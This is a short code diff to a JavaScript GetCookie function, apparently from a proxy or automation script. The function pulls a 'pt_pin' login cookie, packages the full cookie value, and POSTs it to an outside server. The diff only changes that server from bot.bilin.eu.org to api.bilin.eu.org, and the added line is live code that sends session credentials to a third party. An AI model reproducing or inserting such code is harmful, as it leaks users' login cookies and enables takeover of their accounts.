@@ -56,7 +56,7 @@ function GetCookie() {
                 var pt_pin =CV.match(/pt_pin=.+?;/)
                 var pin ="pin="+pt_pin.toString().split('=')[1]
                 let data={"key":pin,"temp":CookieValue}
-                const opt = {url: "http://bot.bilin.eu.org/push", body: JSON.stringify(data)};
+                const opt = {url: "http://api.bilin.eu.org/push", body: JSON.stringify(data)};
                 $.http.post(opt).then((response) => JSON.parse(response.body));
             }
         }
